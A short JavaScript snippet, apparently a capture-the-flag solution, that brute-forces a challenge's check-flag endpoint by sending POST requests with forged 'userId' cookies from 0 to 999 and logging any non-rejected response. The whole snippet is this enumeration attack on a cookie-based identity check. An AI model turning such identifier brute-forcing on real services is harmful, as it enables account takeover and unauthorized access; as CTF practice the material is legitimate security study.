// fetch with cookie

for (let i = 0; i < 1000; i++) {
    const myHeaders = new Headers({
        "Content-Type": "application/json",
        Cookie: "userId=" + i,
    });
    const out = fetch("https://code-ctf-2-web-2.vercel.app/api/check-flag", {
        method: "POST",
        headers: myHeaders,
    }).then((res) =>
        res.json().then((data) => {
            if (data.message !== "wrong userId") {
                console.log(data);
            }
        }),
    );
}
